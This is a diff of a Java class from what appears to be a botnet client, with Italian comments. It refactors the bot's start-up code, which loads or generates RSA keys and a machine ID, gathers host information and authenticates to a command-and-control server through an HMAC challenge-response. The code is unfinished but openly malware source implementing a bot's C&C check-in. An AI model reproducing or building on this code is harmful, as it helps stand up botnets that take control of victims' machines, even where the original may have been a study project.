@@ -1,6 +1,7 @@
-package cs.sii.bot.passive;
+package cs.sii.bot.action;
 
 import java.io.IOException;
+import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 import java.security.NoSuchProviderException;
@@ -10,14 +11,15 @@ import java.util.ArrayList;
 
 import javax.crypto.BadPaddingException;
 import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.NoSuchPaddingException;
 
 import org.apache.commons.codec.binary.Base64;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Service;
 
-import cs.sii.bot.active.BotAuth;
-import cs.sii.config.bot.Engine;
+import cs.sii.config.onLoad.Config;
 import cs.sii.domain.FileUtil;
+import cs.sii.domain.IP;
 import cs.sii.domain.Pairs;
 import cs.sii.service.connection.AsyncRequest;
 import cs.sii.service.connection.NetworkService;
@@ -25,10 +27,10 @@ import cs.sii.service.crypto.CryptoPKI;
 import cs.sii.service.crypto.CryptoUtils;
 
 @Service
-public class BotInitialize {
+public class Behavior {
 
 	@Autowired
-	private Engine engineBot;
+	private Config engineBot;
 
 	@Autowired
 	private NetworkService networkService;
@@ -37,28 +39,24 @@ public class BotInitialize {
 	private AsyncRequest request;
 
 	@Autowired
-	private BotAuth auth;
+	private Auth auth;
 
 	@Autowired
 	private CryptoPKI pki;
 
-	@Autowired
-	private CryptoUtils cryptoUtils;
-
-	public BotInitialize() {
+	public Behavior() {
 	}
 
-	public void initializeBot() throws IOException, NoSuchAlgorithmException, NoSuchProviderException, InvalidKeySpecException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException, SignatureException {
-
-//		ArrayList<String> param = new ArrayList<String>();
-//		param = cryptoUtils.decodeStringsFromFile("");
-		pki.readKeyFromFile();
-
+	/**
+	 * 
+	 */
+	public void initializeBot() {
+		
+		loadInfo();
+		
 		if (!engineBot.isCommandandconquerStatus()) {
-
 			// metter controllo ID se ==NULL genera altrimenti riusa
 			// TODO salvare ID su properties
-
 			// inserire id univoco nella richiesta
 			networkService.firstConnectToMockServerDns();
 			// reinserire id univoco nella richiesta
@@ -70,7 +68,24 @@ public class BotInitialize {
 		}
 	}
 
-	public void getInfo() {
+	/**
+	 * 
+	 */
+	public void loadInfo() {
+
+		try {
+			pki.loadKeyFromFile();
+			networkService.loadNetwork();
+		} catch (InvalidKeyException | InvalidAlgorithmParameterException | IllegalBlockSizeException
+				| BadPaddingException | NoSuchAlgorithmException | NoSuchPaddingException | IOException
+				| InvalidKeySpecException e) {
+			// TODO genera ID
+			if ((pki.getPrivRSAKey() == null)||(Base64.encodeBase64String(pki.getPrivRSAKey().getEncoded())==""))
+				pki.generateKeyRSA();
+			if ((networkService.getIdHash() == null)||(networkService.getIdHash() == ""))
+				networkService.getMachineInfo();
+			e.printStackTrace();
+		}
 
 		// TODO prendi info sistema
 
@@ -79,22 +94,17 @@ public class BotInitialize {
 	}
 
 	private boolean challengeToCommandConquer() {
-		//
-		System.out.println("IP C&C "+networkService.getCommandConquerIps().getIPList().get(0));
-
-		Pairs<Long, Integer> challenge = request.getChallengeFromCommandAndConquer(engineBot.getIdBot(),networkService.getCommandConquerIps().getIPList().get(0));
-
+		System.out.println("IP C&C " + networkService.getCommandConquerIps().getCeCList().get(0).getValue1());
+		Pairs<Long, Integer> challenge = request.getChallengeFromCommandAndConquer(engineBot.getIdBot(),
+				networkService.getCommandConquerIps().getCeCList().get(0).getValue1());
 		if (challenge != null) {
-
 			String key = auth.generateStringKey(challenge.getValue2());
 			String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
 			System.out.println(hashMac);
 			String response = request.getResponseFromCommandAndConquer(engineBot.getIdBot(), networkService.getMac(),
-					networkService.getCommandConquerIps().getIPList().get(0), hashMac);
+					networkService.getCommandConquerIps().getCeCList().get(0).getValue1(), hashMac);
 			System.out.println("La risposta del CeC: " + response);
-
 		}
-
 		return true;
 	}
 
